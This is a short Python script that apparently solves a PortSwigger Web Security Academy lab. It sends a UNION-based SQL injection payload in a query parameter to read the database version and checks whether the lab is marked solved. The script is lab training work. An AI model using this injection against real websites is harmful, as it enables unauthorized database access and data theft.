import requests

url = "https://0ac9003503633dff836e1e3800aa006a.web-security-academy.net/filter"

cookies = {
    "session": "bWvYBb1JtZbG2hcRrd7riXofwX2mIhjj"
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": "https://portswigger.com",
    "Accept-Language": "en-US,en;q=0.9"
}

params = {
    "category": "Accessories' UNION SELECT version(), NULL-- -"
}

r = requests.get(url, headers=headers, cookies=cookies, params=params)

if "Congratulations, you solved the lab!" in r.text:
    print("Lab is Solved!")
else:
    print("Lab is not SolveD!")
    
print(r.text)